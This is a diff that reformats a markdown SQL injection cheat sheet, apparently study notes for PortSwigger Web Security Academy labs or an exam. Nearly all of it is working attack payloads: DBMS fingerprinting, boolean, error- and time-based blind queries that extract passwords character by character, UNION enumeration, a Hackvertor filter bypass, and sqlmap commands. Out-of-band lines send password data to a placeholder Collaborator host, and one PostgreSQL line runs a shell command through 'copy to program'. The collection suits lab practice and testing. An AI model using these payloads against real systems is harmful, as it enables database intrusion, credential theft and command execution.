@@ -5,165 +5,249 @@ https://portswigger.net/web-security/sql-injection/cheat-sheet
 # 1. IDENTIFY DBMS
 
 -- **_Find columns_**
-`' order by 10-- -`
+```sql
+' order by 10-- -
+```
 
 -- **_String concatenation test_**
-`'a' 'b'`       -- MySQL
-`'a'||'b'`      -- PostgreSQL, Oracle
-`'a'+'b'`       -- MSSQL
+```sql
+'a' 'b'       
+'a'||'b'      
+'a'+'b'       
+```
 
 -- **_Oracle Dual table test_**
-`'||(SELECT '')||'`            -- error (Not Oracle)
-`'||(SELECT '' FROM dual)||'`  -- valid (Oracle)
-`UNION SELECT NULL,NULL FROM dual-- -`
+```sql
+'||(SELECT '')||'            
+'||(SELECT '' FROM dual)||'  
+UNION SELECT NULL,NULL FROM dual-- -
+```
+
+---
 
 # 2. GENERAL PAYLOADS
 
 -- **_Check if database exists / Conditional Responses_**
-`TrackingId=xyz' AND (SELECT 'a' FROM <table> LIMIT 1)='a`
-`TrackingId=G6gw8KYi6CTDMGv3' and (select 'a' from <table> where <column>='<value>')='a'-- -`
+```sql
+TrackingId=xyz' AND (SELECT 'a' FROM <table> LIMIT 1)='a
+TrackingId=G6gw8KYi6CTDMGv3' and (select 'a' from <table> where <column>='<value>')='a'-- -
+```
 
 -- **_Check password length (Boolean)_**
-`TrackingId=xyz' AND (SELECT 'a' FROM <table> WHERE <user_column>='<username>' AND LENGTH(<password_column>)>1)='a`
-`' and (select 'a' from <table> where <user_column>='<username>' and length(<password_column>)=20)='a'-- -`
+```sql
+TrackingId=xyz' AND (SELECT 'a' FROM <table> WHERE <user_column>='<username>' AND LENGTH(<password_column>)>1)='a
+' and (select 'a' from <table> where <user_column>='<username>' and length(<password_column>)=20)='a'-- -
+```
 
 -- **_Brute force password (Boolean)_**
-`TrackingId=xyz' AND (SELECT SUBSTRING(<password_column>,1,1) FROM <table> WHERE <user_column>='<username>')='a`
-`' and (select substring(<password_column>,1,1) from <table> where <user_column>='<username>')='o'-- -`
+```sql
+TrackingId=xyz' AND (SELECT SUBSTRING(<password_column>,1,1) FROM <table> WHERE <user_column>='<username>')='a
+' and (select substring(<password_column>,1,1) from <table> where <user_column>='<username>')='o'-- -
+```
 
 -- **_Visible Error-Based (Casting)_**
-`' or 1=cast((select <password_column> from <table> limit 1) as INT) -- -`
-`TrackingId=' AND 1=CAST((SELECT <user_column> FROM <table> LIMIT 1) AS int)-- -`
-`TrackingId=' AND 1=CAST((SELECT <password_column> FROM <table> LIMIT 1) AS int)-- -`
+```sql
+' or 1=cast((select <password_column> from <table> limit 1) as INT) -- -
+TrackingId=' AND 1=CAST((SELECT <user_column> FROM <table> LIMIT 1) AS int)-- -
+TrackingId=' AND 1=CAST((SELECT <password_column> FROM <table> LIMIT 1) AS int)-- -
+```
+
+---
 
 # 3. ORACLE
 
 -- **_Version_**
-`' union select 'a',banner from v$version-- -`
+```sql
+' union select 'a',banner from v$version-- -
+```
 
 -- **_Tables_**
-`'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
-`' union select NULL, table_name from all_tables -- -`
+```sql
+'+UNION+SELECT+table_name,NULL+FROM+all_tables--
+' union select NULL, table_name from all_tables -- -
+```
 
 -- **_Columns_**
-`'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='<table>'--`
-`' union select NULL, column_name from all_tab_columns where table_name='<table>' -- -`
+```sql
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='<table>'--
+' union select NULL, column_name from all_tab_columns where table_name='<table>' -- -
+```
 
 -- **_Extract Data_**
-`'+UNION+SELECT+<column1>,+<column2>+FROM+<table>--`
+```sql
+'+UNION+SELECT+<column1>,+<column2>+FROM+<table>--
+```
 
 -- **_Conditional Error (1/0)_**
-`'||(select case when(2=1) then to_char(1/0) else '' end from <table> where <user_column>='<username>')||'-- -`
-`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
-`'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
-`TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM <table> WHERE <user_column>='<username>')||'`
+```sql
+'||(select case when(2=1) then to_char(1/0) else '' end from <table> where <user_column>='<username>')||'-- -
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM <table> WHERE <user_column>='<username>')||'
+```
 
 -- **_Conditional Error (Length)_**
-`'||(SELECT CASE WHEN LENGTH(<password_column>)>1 THEN to_char(1/0) ELSE '' END FROM <table> WHERE <user_column>='<username>')||'`
+```sql
+'||(SELECT CASE WHEN LENGTH(<password_column>)>1 THEN to_char(1/0) ELSE '' END FROM <table> WHERE <user_column>='<username>')||'
+```
 
 -- **_Conditional Error (Brute force)_**
-`'||(SELECT CASE WHEN SUBSTR(<password_column>,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM <table> WHERE <user_column>='<username>')||'`
+```sql
+'||(SELECT CASE WHEN SUBSTR(<password_column>,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM <table> WHERE <user_column>='<username>')||'
+```
 
 -- **_Time Delays_**
-`' dbms_pipe.receive_message(('a'),20)-- -`
-`' SELECT dbms_pipe.receive_message(('a'),20)-- -`
-`' UNION SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),20) ELSE NULL END FROM dual'-- -`
+```sql
+' dbms_pipe.receive_message(('a'),20)-- -
+' SELECT dbms_pipe.receive_message(('a'),20)-- -
+' UNION SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),20) ELSE NULL END FROM dual'-- -
+```
 
 -- **_OOB (Collaborator)_**
-`' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %25remote%3b]>'),'/l') FROM dual-- -`
-`' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://'||(select <password_column> from <table> where <user_column>='<username>')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %25remote%3b]>'),'/l') FROM dual-- -`
-`' SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')-- -`
+```sql
+' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %25remote%3b]>'),'/l') FROM dual-- -
+' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://'||(select <password_column> from <table> where <user_column>='<username>')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %25remote%3b]>'),'/l') FROM dual-- -
+' SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')-- -
+```
+
+---
 
 # 4. POSTGRESQL
 
 -- **_Schema / Database Name (Works on MySQL/MSSQL too)_**
-`' union select NULL, schema_name from information_schema.schemata -- -`
-`' union select group_concat(schema_name) from information_schema.schemata-- -`
-`' union select schema_name from information_schema.schematalimit X,1-- -`
+```sql
+' union select NULL, schema_name from information_schema.schemata -- -
+' union select group_concat(schema_name) from information_schema.schemata-- -
+' union select schema_name from information_schema.schematalimit X,1-- -
+```
 
 -- **_Tables (Works on MySQL/MSSQL too)_**
-`' union select NULL, table_name from information_schema.tables where table_schema='<db>' -- -`
-`' union select group_concat(table_name) from information_schema.tables where table_schema='<db>'-- -`
+```sql
+' union select NULL, table_name from information_schema.tables where table_schema='<db>' -- -
+' union select group_concat(table_name) from information_schema.tables where table_schema='<db>'-- -
+```
 
 -- **_Columns (Works on MySQL/MSSQL too)_**
-`' union select NULL, column_name from information_schema.columns where table_schema='<db>' and table_name='<table>' -- -`
-`' union select group_concat(column_name) from information_schema.columns where table_name='<table>'-- -`
+```sql
+' union select NULL, column_name from information_schema.columns where table_schema='<db>' and table_name='<table>' -- -
+' union select group_concat(column_name) from information_schema.columns where table_name='<table>'-- -
+```
 
 -- **_Extract Data_**
-`' union select NULL, <user_column>||':'||<password_column> from <db>.<table> -- -`
-`' union select <column1>, <column2> from <db>.<table> -- -`
+```sql
+' union select NULL, <user_column>||':'||<password_column> from <db>.<table> -- -
+' union select <column1>, <column2> from <db>.<table> -- -
+```
 
 -- **_Time Delays_**
-`'||pg_sleep(5)-- -`
-`';SELECT pg_sleep(5);--`
-`'%3b select case when(1=1) then pg_sleep(5) else pg_sleep(0) end-- -`
-`'%3BSELECT+CASE+WHEN+(<user_column>='<username>')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+<table>--`
-`'%3b select case when(<user_column>='<username>' and length(<password_column>)=20) then pg_sleep(5) else pg_sleep(0) end from <table>-- -`
-`'%3b select case when(<user_column>='<username>' and substring(<password_column>,1,1)='1') then pg_sleep(5) else pg_sleep(0) end from <table>-- -`
+```sql
+'||pg_sleep(5)-- -
+';SELECT pg_sleep(5);--
+'%3b select case when(1=1) then pg_sleep(5) else pg_sleep(0) end-- -
+'%3BSELECT+CASE+WHEN+(<user_column>='<username>')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+<table>--
+'%3b select case when(<user_column>='<username>' and length(<password_column>)=20) then pg_sleep(5) else pg_sleep(0) end from <table>-- -
+'%3b select case when(<user_column>='<username>' and substring(<password_column>,1,1)='1') then pg_sleep(5) else pg_sleep(0) end from <table>-- -
+```
 
 -- **_OOB (Collaborator)_**
-`copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`
-`create OR replace function f() returns void as $$ declare c text; declare p text; begin SELECT into p (SELECT YOUR-QUERY-HERE); c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN'''; execute c; END; $$ language plpgsql security definer; SELECT f();`
+```sql
+copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
+create OR replace function f() returns void as $$ declare c text; declare p text; begin SELECT into p (SELECT YOUR-QUERY-HERE); c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN'''; execute c; END; $$ language plpgsql security definer; SELECT f();
+```
+
+---
 
 # 5. MYSQL / MARIADB
 
 -- **_Version_**
-`' union select 1,@@version`
+```sql
+' union select 1,@@version
+```
 
 -- **_Extract Data_**
-`' union select group_concat(<column1>,":", <column2>) from <db>.<table>'-- -`
-`' union select NULL, concat(<column1>,':', <column2>) from <db>.<table> -- -`
+```sql
+' union select group_concat(<column1>,":", <column2>) from <db>.<table>'-- -
+' union select NULL, concat(<column1>,':', <column2>) from <db>.<table> -- -
+```
 
 -- **_Time Delays_**
-`' and sleep(5)-- -`
-`1 or sleep(5)#`
-`" or sleep(5)="`
-`' SELECT IF(1=1,SLEEP(20),'a')-- -`
+```sql
+' and sleep(5)-- -
+1 or sleep(5)#
+" or sleep(5)="
+' SELECT IF(1=1,SLEEP(20),'a')-- -
+```
 
 -- **_Fuzzing / Evasion_**
-`' or benchmark(10000000,MD5(1))#`
-`+benchmark(3200,SHA1(1))+'`
+```sql
+' or benchmark(10000000,MD5(1))#
++benchmark(3200,SHA1(1))+'
+```
 
 -- **_OOB (Windows only)_**
-`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`
-`SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`
+```sql
+LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
+SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
+```
+
+---
 
 # 6. MSSQL
 
 -- **_Version_**
-`' union select 1,@@version`
+```sql
+' union select 1,@@version
+```
 
 -- **_Time Delays_**
-`;waitfor delay '0:0:5'--`
-`' IF (1=1) WAITFOR DELAY '0:0:20'-- -`
+```sql
+;waitfor delay '0:0:5'--
+' IF (1=1) WAITFOR DELAY '0:0:20'-- -
+```
 
 -- **_OOB_**
-`exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`
-`declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')`
+```sql
+exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
+declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
+```
+
+---
 
 # 7. HACKVERTOR XML BYPASS (BURP EXTENSION)
 
 -- **_XML Entities Payload_**
-`<@hex_entities>UNION SELECT NULL<@/hex_entities>`
-`<@hex_entities>UNION SELECT schema_name FROM information_schema.schemata<@/hex_entities>`
-`<@hex_entities>UNION SELECT table_name FROM information_schema.tables WHERE table_schema='<db>'<@/hex_entities>`
-`<@hex_entities>UNION SELECT column_name FROM information_schema.columns WHERE table_name='<table>'<@/hex_entities>`
-`<@hex_entities>UNION SELECT <password_column> FROM <db>.<table> WHERE <user_column>='<username>'<@/hex_entities>`
+```xml
+<@hex_entities>UNION SELECT NULL<@/hex_entities>
+<@hex_entities>UNION SELECT schema_name FROM information_schema.schemata<@/hex_entities>
+<@hex_entities>UNION SELECT table_name FROM information_schema.tables WHERE table_schema='<db>'<@/hex_entities>
+<@hex_entities>UNION SELECT column_name FROM information_schema.columns WHERE table_name='<table>'<@/hex_entities>
+<@hex_entities>UNION SELECT <password_column> FROM <db>.<table> WHERE <user_column>='<username>'<@/hex_entities>
+```
+
+---
 
 # 8. SQLMAP
 
 -- **_Basics_**
-`sqlmap -u '' --cookie='' --random-agent -p order --level 5 --risk 1 --batch --dbms='postgresql'`
-`sqlmap -u "https://<exam-url>/searchadvanced?searchTerm=1*" --cookie="_lab=<change-me>; session=<change-me>" --batch --risk 3 --level 5 --dbms=postgresql --dbs`
+```bash
+sqlmap -u '' --cookie='' --random-agent -p order --level 5 --risk 1 --batch --dbms='postgresql'
+sqlmap -u "https://<exam-url>/searchadvanced?searchTerm=1*" --cookie="_lab=<change-me>; session=<change-me>" --batch --risk 3 --level 5 --dbms=postgresql --dbs
+```
 
 -- **_Enumeration_**
-`-u url` (to get database type)
-`--dbs` (to get database name)
-`-D '<db>' --tables` (to get table names)
-`-D '<db>' -T '<table>' --columns` (to get column names)
+```bash
+-u url
+--dbs
+-D '<db>' --tables
+-D '<db>' -T '<table>' --columns
+```
 
 -- **_Custom Query Injection_**
-`sqlmap -u 'https://0a6d00360460e7dd8187719900d200c5.web-security-academy.net/filter?category=Tech+gifts' -p category --sql-query "SELECT <column1>, <column2> FROM <db>.<table>"`
+```bash
+sqlmap -u '[https://0a6d00360460e7dd8187719900d200c5.web-security-academy.net/filter?category=Tech+gifts](https://0a6d00360460e7dd8187719900d200c5.web-security-academy.net/filter?category=Tech+gifts)' -p category --sql-query "SELECT <column1>, <column2> FROM <db>.<table>"
+```
+
+---
 
 # 9. PYTHON BLIND CONDITIONAL SCRIPT
 
@@ -203,6 +287,8 @@ def exploit():
 
 if __name__ == "__main__":
     exploit()
+```
+
 
 ---
 
